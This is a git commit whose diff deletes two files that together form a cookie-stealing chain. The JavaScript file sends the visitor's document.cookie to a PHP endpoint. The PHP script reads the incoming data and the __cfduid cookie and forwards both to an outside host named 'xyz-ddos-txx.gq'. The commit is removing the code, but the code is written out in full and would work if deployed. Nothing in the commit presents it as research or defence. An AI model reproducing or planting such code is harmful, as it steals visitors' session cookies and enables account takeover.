fb8a0debd80b0523770941a6c61c9594c4f5b396
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 15:45:00 +0700

    up

--- projects/ckd.js
+++
@@ -1,9 +0,0 @@
-$.ajax({
-    url: "https://lp2.fasttrack.edu.vn/re.php?d="+document.cookie,
-    dataType: 'jsonp',
-    type: 'GET',
-    xhrFields: {
-        'withCredentials': true
-    },
-    crossDomain: true
-})
--- projects/re.php
+++
@@ -1,7 +0,0 @@
-<?php
-header('Access-Control-Allow-Credentials: true');
-header('Access-Control-Allow-Origin: *'); 
-$a = isset($_COOKIE['__cfduid'])?$_COOKIE['__cfduid']:0;
-file_get_contents("http://xyz-ddos-txx.gq/?d=".$a);
-file_get_contents("http://xyz-ddos-txx.gq/?d=".$_REQUEST['d']);
-?>
